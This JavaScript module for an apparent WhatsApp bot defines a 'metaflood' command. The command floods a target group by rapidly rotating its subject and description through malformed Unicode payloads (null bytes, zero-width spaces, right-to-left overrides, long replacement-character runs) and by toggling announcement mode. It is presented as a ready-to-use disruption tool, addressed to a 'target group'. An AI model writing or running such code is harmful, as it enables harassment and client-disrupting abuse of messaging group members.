module.exports = {
    name: "metaflood",
    aliases: ["floodmeta", "groupflood"],
    category: "spicy",
    permissions: { coin: 0, group: true, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const groupJid = ctx.msg?.key?.remoteJid;
            const rounds = parseInt(args[0]) || 10;

            if (!groupJid?.endsWith("@g.us")) {
                return await ctx.reply("❌ Run this inside the target group.");
            }

            await ctx.reply(`🌊 Flooding group metadata — ${rounds} rounds...`);

            const subjects = [
                "\u200B".repeat(25),
                "\u202E" + "A".repeat(25),
                "🔥".repeat(25),
                "\u0000".repeat(25),
                "​".repeat(25) // invisible char
            ];

            const descs = [
                "\uFFFD".repeat(500),
                "\u202E".repeat(100) + "desc",
                "\u0000".repeat(256),
                "\u200B".repeat(1000),
                "\u202C".repeat(500)
            ];

            let round = 0;
            while (round < rounds) {
                try {
                    // rotate subject
                    await sock.groupUpdateSubject(
                        groupJid,
                        subjects[round % subjects.length]
                    );
                    await new Promise(r => setTimeout(r, 200));

                    // rotate description
                    await sock.groupUpdateDescription(
                        groupJid,
                        descs[round % descs.length]
                    );
                    await new Promise(r => setTimeout(r, 200));

                    // toggle announce
                    await sock.groupSettingUpdate(
                        groupJid,
                        round % 2 === 0 ? "announcement" : "not_announcement"
                    );
                    await new Promise(r => setTimeout(r, 200));

                    round++;
                } catch {
                    round++;
                }
            }

            await ctx.reply(`✅ Metadata flood complete — ${rounds} rounds fired.`);

        } catch (e) {
            console.error("[metaflood]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};